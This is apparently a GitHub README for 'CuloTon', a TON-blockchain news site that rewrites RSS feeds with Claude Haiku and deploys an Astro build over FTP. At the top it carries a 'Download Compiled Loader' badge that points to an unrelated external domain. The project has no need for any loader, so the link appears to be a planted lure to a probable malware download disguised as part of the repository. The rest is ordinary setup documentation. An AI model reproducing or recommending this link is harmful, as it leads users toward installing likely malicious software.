# CuloTon

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

English-language news platform covering the TON blockchain ecosystem.
Native token: **$CULO**.

Live: https://culoton.fun

## Structure

- `scripts/` — Python pipeline: pull RSS feeds, dedup, rewrite via Claude Haiku, write markdown.
- `web/` — Astro static site (dark theme, content collection from `web/src/content/news/`).
- `.github/workflows/update-and-deploy.yml` — every 2h: fetch news, rebuild, FTP-deploy to seohost.

## Local dev

```sh
# backend
pip install -r requirements.txt
cp .env.example .env  # fill ANTHROPIC_API_KEY
python scripts/fetch_news.py

# frontend
cd web
npm install
npm run dev
```

## Secrets (GitHub Actions)

- `ANTHROPIC_API_KEY` — Claude Haiku 4.5 for rewriting
- `FTP_PASSWORD` — FTPS deploy to `culoton@culoton.fun` on `h66.seohost.pl`
